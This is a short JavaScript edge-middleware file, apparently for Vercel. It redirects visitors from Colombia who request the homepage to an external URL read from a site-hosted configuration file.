export const config = {
  matcher: ["/", "/index.html"]
};

export default async function middleware(request) {
  const country = String(request.headers.get("x-vercel-ip-country") || "").toUpperCase();
  if (country !== "CO") return;

  try {
    const js = await fetch(new URL("/ENLACES-IP.js", request.url), { cache: "no-store" }).then(function (r) {
      return r.text();
    });
    const match = js.match(/colombia\s*:\s*["']([^"']+)["']/);
    if (!match) return;
    const dest = match[1];
    const destUrl = new URL(dest, request.url);
    if (destUrl.origin === new URL(request.url).origin) return;
    return Response.redirect(dest, 302);
  } catch (e) {
    return;
  }
}
